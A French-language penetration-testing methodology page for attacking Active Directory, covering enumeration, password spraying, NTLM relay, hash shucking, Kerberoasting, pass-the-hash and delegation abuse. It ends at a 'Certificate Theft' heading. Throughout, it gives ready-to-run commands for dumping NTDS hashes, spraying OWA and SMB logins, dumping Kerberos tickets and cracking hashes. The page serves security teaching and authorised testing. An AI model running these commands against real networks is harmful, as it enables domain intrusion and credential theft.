# Active Directory Méthodologie

{{#include ../../banners/hacktricks-training.md}}

## Aperçu de base

**Active Directory** sert de technologie fondamentale, permettant aux **administrateurs réseau** de créer et gérer efficacement les **domaines**, **utilisateurs** et **objets** au sein d'un réseau. Il est conçu pour monter en charge, facilitant l'organisation d'un grand nombre d'utilisateurs en **groupes** et **sous-groupes** gérables, tout en contrôlant les **droits d'accès** à différents niveaux.

La structure d'**Active Directory** se compose de trois couches principales : **domaines**, **arbres** (trees) et **forêts** (forests). Un **domaine** englobe une collection d'objets, comme des **utilisateurs** ou des **appareils**, partageant une base de données commune. Les **trees** sont des groupes de ces domaines liés par une structure partagée, et une **forest** représente la collection de plusieurs trees, interconnectés par des **trust relationships**, formant la couche la plus haute de la structure organisationnelle. Des **droits d'accès** et de **communication** spécifiques peuvent être définis à chacun de ces niveaux.

Concepts clés dans **Active Directory** :

1. **Directory** – Contient toutes les informations relatives aux objets Active Directory.
2. **Object** – Désigne les entités dans le directory, y compris les **utilisateurs**, **groupes** ou **partages**.
3. **Domain** – Sert de conteneur pour les objets du directory ; plusieurs domaines peuvent coexister au sein d'une **forest**, chacun conservant sa propre collection d'objets.
4. **Tree** – Regroupement de domaines partageant un domaine racine commun.
5. **Forest** – Le sommet de la structure organisationnelle dans Active Directory, composé de plusieurs trees avec des **trust relationships** entre eux.

**Active Directory Domain Services (AD DS)** englobe une série de services critiques pour la gestion centralisée et la communication dans un réseau. Ces services comprennent :

1. **Domain Services** – Centralise le stockage des données et gère les interactions entre les **utilisateurs** et les **domaines**, incluant l'**authentication** et les fonctions de **search**.
2. **Certificate Services** – Supervise la création, la distribution et la gestion des **certificats numériques** sécurisés.
3. **Lightweight Directory Services** – Prend en charge les applications habilitées au directory via le **LDAP protocol**.
4. **Directory Federation Services** – Fournit des capacités de **single-sign-on** pour authentifier les utilisateurs sur plusieurs applications web en une seule session.
5. **Rights Management** – Aide à protéger le contenu soumis au droit d'auteur en régulant sa distribution et son utilisation non autorisées.
6. **DNS Service** – Crucial pour la résolution des **domain names**.

Pour une explication plus détaillée, consultez : [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Pour apprendre à **attaquer un AD**, vous devez très bien comprendre le processus d'**authentification Kerberos**.\
[**Lisez cette page si vous ne savez pas encore comment cela fonctionne.**](kerberos-authentication.md)

## Cheat Sheet

Vous pouvez consulter https://wadcoms.github.io/ pour avoir un aperçu rapide des commandes à exécuter pour **énumérer/exploiter** un AD.

> [!WARNING]
> La communication Kerberos **requiert un nom de domaine complet (FQDN)** pour effectuer des actions. Si vous essayez d'accéder à une machine via son adresse IP, **cela utilisera NTLM et non Kerberos**.

## Recon Active Directory (No creds/sessions)

Si vous avez simplement accès à un environnement AD mais que vous n'avez aucun identifiants/sessions, vous pouvez :

- **Pentest the network :**
- Scannez le réseau, trouvez les machines et les ports ouverts et essayez d'**exploiter des vulnérabilités** ou d'**extraire des credentials** depuis celles-ci (par exemple, [les imprimantes peuvent être des cibles très intéressantes](ad-information-in-printers.md)).
- L'énumération DNS peut fournir des informations sur les serveurs clés du domaine comme web, imprimantes, partages, vpn, médias, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Jetez un œil à la [**méthodologie générale Pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) pour trouver plus d'informations sur comment procéder.
- **Vérifiez l'accès null et Guest sur les services smb** (cela ne fonctionnera pas sur les versions modernes de Windows) :
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Un guide plus détaillé sur l'énumération d'un serveur SMB se trouve ici :


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumérer Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Un guide plus détaillé sur l'énumération LDAP est disponible ici (faites **particulièrement attention à l'accès anonyme**) :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Empoisonner le réseau**
- Récupérer des credentials en **usurpant des services avec Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accéder à un hôte en [**abusant d'une relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Récupérer des credentials en **exposant de faux services UPnP avec evil-S** (../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html) :
- Extraire des usernames/noms depuis des documents internes, les réseaux sociaux, services (principalement web) dans l'environnement du domaine et aussi depuis des sources publiques.
- Si vous trouvez les noms complets des employés, vous pouvez tenter différentes conventions de **username AD** ([**lire ceci**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Les conventions les plus courantes sont : _NameSurname_, _Name.Surname_, _NamSur_ (3 lettres de chaque), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettres aléatoires et 3 chiffres aléatoires_ (abc123).
- Outils :
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum :** Consultez les pages [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) et [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum** : Quand un **username invalide est demandé**, le serveur répondra avec le **code d'erreur Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ce qui permet de déterminer que le nom d'utilisateur est invalide. Les **usernames valides** déclencheront soit un **TGT dans une réponse AS-REP**, soit l'erreur _KRB5KDC_ERR_PREAUTH_REQUIRED_, indiquant que l'utilisateur doit effectuer une pré-authentification.
- **No Authentication against MS-NRPC** : Utilisation de auth-level = 1 (No authentication) contre l'interface MS-NRPC (Netlogon) sur les domain controllers. La méthode appelle la fonction `DsrGetDcNameEx2` après avoir lié l'interface MS-NRPC pour vérifier si l'utilisateur ou l'ordinateur existe sans aucune credentials. L'outil [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implémente ce type d'énumération. La recherche est disponible [ici](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Si vous trouvez un de ces serveurs sur le réseau, vous pouvez également effectuer une **user enumeration à son encontre**. Par exemple, vous pouvez utiliser l'outil [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Vous pouvez trouver des listes de noms d'utilisateurs dans [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  et celui-ci ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Cependant, vous devriez avoir le(s) **nom(s) des personnes travaillant dans l'entreprise** à partir de l'étape de recon que vous auriez dû effectuer auparavant. Avec le prénom et le nom de famille vous pouvez utiliser le script [**namemash.py**](https://gist.github.com/superkojiman/11076951) pour générer des noms d'utilisateur potentiellement valides.

### Connaître un ou plusieurs noms d'utilisateur

Ok, donc vous savez déjà qu'un nom d'utilisateur est valide mais vous n'avez pas de mots de passe... Essayez alors :

- [**ASREPRoast**](asreproast.md): Si un utilisateur **n'a pas** l'attribut _DONT_REQ_PREAUTH_ vous pouvez **demander un message AS_REP** pour cet utilisateur qui contiendra des données chiffrées par une dérivation du mot de passe de l'utilisateur.
- [**Password Spraying**](password-spraying.md): Essayez les **mots de passe les plus courants** avec chacun des utilisateurs découverts ; peut‑être qu'un utilisateur utilise un mauvais mot de passe (gardez la password policy à l'esprit !).
- Notez que vous pouvez aussi **spray OWA servers** pour tenter d'obtenir l'accès aux serveurs mail des utilisateurs.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Vous pourriez être capable d'**obtenir** certains challenge **hashes** à cracker en **poisoning** certains protocoles du **network** :


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Si vous avez réussi à énumérer l'Active Directory vous disposerez de **plus d'e-mails et d'une meilleure compréhension du network**. Vous pourriez être en mesure de forcer des NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) pour obtenir l'accès à l'environnement AD.

### NetExec workspace-driven recon & relay posture checks

- Utilisez **`nxcdb` workspaces** pour conserver l'état de recon AD par engagement : `workspace create <name>` crée des SQLite DBs par protocole sous `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Changez d'affichage avec `proto smb|mssql|winrm` et affichez les secrets rassemblés avec `creds`. Purgerez manuellement les données sensibles une fois terminé : `rm -rf ~/.nxc/workspaces/<name>`.
- La découverte rapide de subnet avec **`netexec smb <cidr>`** révèle **domain**, **OS build**, **SMB signing requirements**, et **Null Auth**. Les hôtes affichant `(signing:False)` sont **relay-prone**, tandis que les DCs exigent souvent le signing.
- Générez des **hostnames in /etc/hosts** directement depuis la sortie de NetExec pour faciliter le ciblage :
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Lorsque **SMB relay to the DC is blocked** par signing, probez quand même la posture **LDAP** : `netexec ldap <dc>` met en évidence `(signing:None)` / weak channel binding. Un DC exigeant SMB signing mais avec LDAP signing désactivé reste une cible viable de **relay-to-LDAP** pour des abus comme **SPN-less RBCD**.

### Côté client : identifiants d'imprimante leaks → validation en masse des identifiants de domaine

- Les UI d'imprimante/web intègrent parfois **des mots de passe admin masqués dans le HTML**. Consulter la source / devtools peut révéler le texte en clair (par ex., `<input value="<password>">`), permettant l'accès Basic-auth aux répertoires de scan/impression.
- Les jobs d'impression récupérés peuvent contenir des **documents d'intégration en clair** avec des mots de passe par utilisateur. Conservez les appariements alignés lors des tests:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Voler des identifiants NTLM

Si vous pouvez **accéder à d'autres PC ou partages** avec l'utilisateur **null** ou **guest** vous pouvez **placer des fichiers** (comme un fichier SCF) qui, si quelqu'un y accède, vont **déclencher une authentification NTLM contre vous** afin que vous puissiez **voler** le **challenge NTLM** pour le craquer :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** considère chaque NT hash que vous possédez déjà comme un mot de passe candidat pour d'autres formats plus lents dont le matériel clé est dérivé directement du NT hash. Au lieu de brute-forcer de longues phrases de passe dans des Kerberos RC4 tickets, des challenges NetNTLM, ou des cached credentials, vous injectez les NT hashes dans les modes NT-candidate de Hashcat et laissez Hashcat valider la réutilisation de mot de passe sans jamais connaître le texte en clair. C'est particulièrement puissant après une compromission de domaine où vous pouvez récolter des milliers de NT hashes actuels et historiques.

Utilisez shucking quand :

- Vous avez un corpus NT issu de DCSync, dumps NTDS/SAM/SECURITY, ou de credential vaults et devez tester la réutilisation dans d'autres domaines/forests.
- Vous capturez du matériel Kerberos basé sur RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), des réponses NetNTLM, ou des blobs DCC/DCC2.
- Vous voulez prouver rapidement la réutilisation pour de longues phrases de passe incompressibles et pivoter immédiatement via Pass-the-Hash.

La technique **ne fonctionne pas** contre des types de chiffrement dont les clés ne sont pas dérivées du NT hash (par ex., Kerberos etype 17/18 AES). Si un domaine impose AES-only, vous devez revenir aux modes mot de passe classiques.

#### Constituer un corpus de hachages NT

- **DCSync/NTDS** – Utilisez `secretsdump.py` avec history pour récupérer le plus grand ensemble possible de NT hashes (et leurs valeurs précédentes) :

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Les entrées d'historique élargissent considérablement le pool de candidats car Microsoft peut stocker jusqu'à 24 hashes précédents par compte. Pour d'autres méthodes de collecte des secrets NTDS voir :

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrait les données SAM/SECURITY locales et les cached domain logons (DCC/DCC2). Dédupliquez et ajoutez ces hashes au même fichier `nt_candidates.txt`.
- **Suivre les métadonnées** – Conservez le nom d'utilisateur/domaine qui a produit chaque hash (même si la wordlist contient seulement de l'hex). Les hashes correspondants vous indiquent immédiatement quel principal réutilise un mot de passe une fois que Hashcat affiche le candidat gagnant.
- Préférez des candidats issus du même forest ou d'un forest de confiance ; cela maximise la probabilité de chevauchement lors du shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes :

- Les entrées NT-candidate **doivent rester des NT hashes bruts en 32 hex**. Désactivez les moteurs de règles (pas de `-r`, pas de modes hybrides) car la mangling corrompt le matériau clé du candidat.
- Ces modes ne sont pas intrinsèquement plus rapides, mais l'espace de clés NTLM (~30,000 MH/s sur un M3 Max) est ~100× plus rapide que Kerberos RC4 (~300 MH/s). Tester une liste NT curatée coûte bien moins cher que d'explorer tout l'espace de mots de passe dans le format lent.
- Exécutez toujours la **dernière build de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) car les modes 31500/31600/35300/35400 ont été ajoutés récemment.
- Il n'existe actuellement aucun mode NT pour AS-REQ Pre-Auth, et les etypes AES (19600/19700) exigent le mot de passe en clair car leurs clés sont dérivées via PBKDF2 à partir de mots de passe UTF-16LE, pas de NT hashes bruts.

#### Exemple – Kerberoast RC4 (mode 35300)

1. Capturez un TGS RC4 pour un SPN cible avec un utilisateur à faibles privilèges (voir la page Kerberoast pour les détails) :

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuckez le ticket avec votre liste NT :

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat dérive la clé RC4 de chaque candidat NT et valide le blob `$krb5tgs$23$...`. Une correspondance confirme que le compte de service utilise l'un de vos NT hashes existants.

3. Pivotez immédiatement via PtH :

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Vous pouvez éventuellement récupérer le texte en clair plus tard avec `hashcat -m 1000 <matched_hash> wordlists/` si nécessaire.

#### Exemple – Cached credentials (mode 31600)

1. Dumpez les cached logons depuis une workstation compromise :

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copiez la ligne DCC2 pour l'utilisateur de domaine intéressant dans `dcc2_highpriv.txt` et shuckez-la :

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Une correspondance réussie révèle le NT hash déjà connu dans votre liste, prouvant que l'utilisateur mis en cache réutilise un mot de passe. Utilisez-le directement pour PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou brute-forcez-le en mode NTLM rapide pour récupérer la chaîne.

Le même workflow s'applique aux NetNTLM challenge-responses (`-m 27000/27100`) et DCC (`-m 31500`). Une fois une correspondance identifiée, vous pouvez lancer relay, SMB/WMI/WinRM PtH, ou re-craquer le NT hash avec masks/rules hors ligne.



## Énumération d'Active Directory AVEC des identifiants/session

Pour cette phase, vous devez avoir **compromis les identifiants ou une session d'un compte de domaine valide.** Si vous disposez de quelques identifiants valides ou d'un shell en tant qu'utilisateur de domaine, **rappelez-vous que les options données précédemment restent des options pour compromettre d'autres utilisateurs**.

Avant de commencer l'énumération authentifiée vous devriez connaître le **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Énumération

Avoir compromis un compte est une **grande étape pour commencer à compromettre tout le domaine**, car vous allez pouvoir démarrer l'**Active Directory Enumeration :**

Concernant [**ASREPRoast**](asreproast.md) vous pouvez maintenant trouver tous les utilisateurs vulnérables possibles, et concernant [**Password Spraying**](password-spraying.md) vous pouvez obtenir une **liste de tous les noms d'utilisateur** et essayer le mot de passe du compte compromis, les mots de passe vides et de nouveaux mots de passe prometteurs.

- Vous pouvez utiliser le [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Vous pouvez aussi utiliser [**powershell for recon**](../basic-powershell-for-pentesters/index.html) qui sera plus stealthy
- Vous pouvez aussi [**use powerview**](../basic-powershell-for-pentesters/powerview.md) pour extraire des informations plus détaillées
- Un autre outil incroyable pour le recon dans un active directory est [**BloodHound**](bloodhound.md). Il n'est **pas très stealthy** (selon les méthodes de collecte que vous utilisez), mais **si cela ne vous préoccupe pas**, vous devriez absolument l'essayer. Trouvez où les utilisateurs peuvent RDP, trouvez des chemins vers d'autres groupes, etc.
- D'autres outils d'énumération AD automatisés sont : [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) car ils peuvent contenir des informations intéressantes.
- Un **outil avec GUI** que vous pouvez utiliser pour énumérer l'annuaire est **AdExplorer.exe** de la suite **SysInternal**.
- Vous pouvez aussi rechercher dans la base LDAP avec **ldapsearch** pour chercher des credentials dans les champs _userPassword_ & _unixUserPassword_, ou même dans _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) pour d'autres méthodes.
- Si vous utilisez **Linux**, vous pouvez également énumérer le domaine en utilisant [**pywerview**](https://github.com/the-useless-one/pywerview).
- Vous pouvez aussi essayer des outils automatisés comme :
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraction de tous les utilisateurs du domaine**

Il est très facile d'obtenir tous les noms d'utilisateur du domaine depuis Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). Sous Linux, vous pouvez utiliser : `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Même si cette section Énumération semble courte, c'est la partie la plus importante de toutes. Accédez aux liens (principalement ceux de cmd, powershell, powerview et BloodHound), apprenez à énumérer un domaine et entraînez-vous jusqu'à être à l'aise. Lors d'une évaluation, ce sera le moment clé pour trouver votre chemin vers DA ou pour décider qu'il n'y a rien à faire.

### Kerberoast

Kerberoasting consiste à obtenir des **TGS tickets** utilisés par des services liés à des comptes utilisateur et à cracker leur chiffrement — qui est basé sur les mots de passe utilisateur — **hors ligne**.

Plus d'informations dans :


{{#ref}}
kerberoast.md
{{#endref}}

### Connexion distante (RDP, SSH, FTP, Win-RM, etc)

Une fois que vous avez obtenu des identifiants vous pouvez vérifier si vous avez accès à une **machine**. Pour cela, vous pouvez utiliser **CrackMapExec** pour tenter de vous connecter à plusieurs serveurs avec différents protocoles, en fonction de vos scans de ports.

### Escalade de privilèges local

Si vous avez compromis des identifiants ou une session en tant qu'utilisateur de domaine régulier et que vous avez **accès** avec cet utilisateur à **n'importe quelle machine du domaine**, vous devriez essayer de trouver un moyen d'**escalader les privilèges localement et piller des credentials**. En effet, ce n'est qu'avec des privilèges d'administrateur local que vous pourrez **dump les hashes d'autres utilisateurs** en mémoire (LSASS) et localement (SAM).

Il y a une page complète dans ce livre sur [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) et une [**checklist**](../checklist-windows-privilege-escalation.md). De plus, n'oubliez pas d'utiliser [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets de session actuels

Il est très **improbable** que vous trouviez des **tickets** dans l'utilisateur courant **vous donnant la permission d'accéder** à des ressources inattendues, mais vous pouvez vérifier :
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Si vous avez réussi à énumérer l'Active Directory vous aurez **plus d'adresses e-mail et une meilleure compréhension du réseau**. Vous pourriez être capable de forcer NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Maintenant que vous avez des credentials de base vous devriez vérifier si vous pouvez **trouver** des **fichiers intéressants partagés dans l'AD**. Vous pouvez le faire manuellement mais c'est une tâche très ennuyeuse et répétitive (et d'autant plus si vous trouvez des centaines de docs à vérifier).

[**Suivez ce lien pour découvrir les outils que vous pouvez utiliser.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Si vous pouvez **accéder à d'autres PCs ou shares** vous pouvez **placer des fichiers** (comme un fichier SCF) qui, s'ils sont ouverts, vont **déclencher une authentification NTLM contre vous** afin que vous puissiez **voler** le **NTLM challenge** pour le craquer:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Cette vulnérabilité permettait à n'importe quel utilisateur authentifié de **compromettre le domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Pour les techniques suivantes un utilisateur de domaine standard ne suffit pas, vous avez besoin de privilèges/credentials spéciaux pour effectuer ces attaques.**

### Hash extraction

Espérons que vous avez réussi à **compromettre un compte local admin** en utilisant [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Ensuite, il est temps de dumper tous les hashes en mémoire et localement.\
[**Lisez cette page sur les différentes manières d'obtenir les hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Une fois que vous avez le hash d'un utilisateur**, vous pouvez l'utiliser pour **vous faire passer pour lui**.\
Vous devez utiliser un **outil** qui va **effectuer** l'**authentification NTLM en utilisant** ce **hash**, **ou** vous pouvez créer un nouveau **sessionlogon** et **injecter** ce **hash** dans le **LSASS**, de sorte que lorsqu'une **authentification NTLM** est effectuée, ce **hash sera utilisé.** La dernière option est ce que fait mimikatz.\
[**Lisez cette page pour plus d'informations.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Cette attaque vise à **utiliser le hash NTLM de l'utilisateur pour demander des tickets Kerberos**, comme alternative au classique Pass The Hash sur le protocole NTLM. Par conséquent, cela peut être particulièrement **utile dans les réseaux où le protocole NTLM est désactivé** et seul **Kerberos est autorisé** comme protocole d'authentification.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Dans la méthode d'attaque **Pass The Ticket (PTT)**, les attaquants **volent le ticket d'authentification d'un utilisateur** au lieu de son mot de passe ou de ses valeurs de hash. Ce ticket volé est ensuite utilisé pour **se faire passer pour l'utilisateur**, obtenant un accès non autorisé aux ressources et services du réseau.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Si vous avez le **hash** ou le **password** d'un **local admin** vous devriez essayer de **vous connecter localement** à d'autres **PCs** avec celui-ci.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note that this is quite **noisy** and **LAPS** would **mitigate** it.

### MSSQL Abuse & Trusted Links

Si un utilisateur a les privilèges pour **accéder aux instances MSSQL**, il pourrait être capable de les utiliser pour **exécuter des commandes** sur l'hôte MSSQL (si le service tourne en tant que SA), **voler** le **hash** NetNTLM ou même réaliser une **relay attack**.\
Aussi, si une instance MSSQL est trusted (database link) par une autre instance MSSQL. Si l'utilisateur a des privilèges sur la base de données de confiance, il pourra **utiliser la relation de confiance pour exécuter des requêtes également sur l'autre instance**. Ces trusts peuvent être enchaînés et à un certain moment l'utilisateur pourrait trouver une base de données mal configurée où il peut exécuter des commandes.\
**Les liens entre bases de données fonctionnent même à travers des forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Les suites tierces d'inventaire et de déploiement exposent souvent des voies puissantes vers des credentials et l'exécution de code. Voir :

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si vous trouvez un objet Computer avec l'attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) et que vous avez des privilèges sur la machine, vous pourrez dumper les TGTs en mémoire de tous les utilisateurs qui se connectent sur l'ordinateur.\
Donc, si un **Administrateur de domaine se connecte sur la machine**, vous pourrez dumper son TGT et l'usurper en utilisant [Pass the Ticket](pass-the-ticket.md).\
Grâce à la constrained delegation vous pourriez même **comprendre automatiquement un Print Server** (avec un peu de chance ce sera un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si un utilisateur ou un ordinateur est autorisé pour la "Constrained Delegation" il pourra **usurper n'importe quel utilisateur pour accéder à certains services sur un ordinateur**.\
Ensuite, si vous **compromettez le hash** de cet utilisateur/ordinateur vous pourrez **usurper n'importe quel utilisateur** (même des administrateurs de domaine) pour accéder à certains services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avoir le privilège **WRITE** sur un objet Active Directory d'un ordinateur distant permet d'obtenir une exécution de code avec des **privilèges élevés** :


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utilisateur compromis pourrait avoir des **privilèges intéressants sur certains objets du domaine** qui pourraient vous permettre de **vous déplacer latéralement / d'escalader** des privilèges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Découvrir un **service Spool à l'écoute** dans le domaine peut être **abusé** pour **acquérir de nouveaux credentials** et **escalader des privilèges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Si **d'autres utilisateurs** **accèdent** à la machine **compromise**, il est possible de **récupérer des credentials depuis la mémoire** et même **injecter des beacons dans leurs processus** pour les usurper.\
Généralement les utilisateurs accèdent au système via RDP, voici donc comment effectuer quelques attaques sur des sessions RDP tierces :


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fournit un système pour gérer le **mot de passe Administrator local** sur les machines jointes au domaine, en s'assurant qu'il est **aléatoire**, unique et fréquemment **changé**. Ces mots de passe sont stockés dans Active Directory et l'accès est contrôlé via des ACLs pour les utilisateurs autorisés seulement. Avec des permissions suffisantes pour accéder à ces mots de passe, le pivot vers d'autres machines devient possible.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

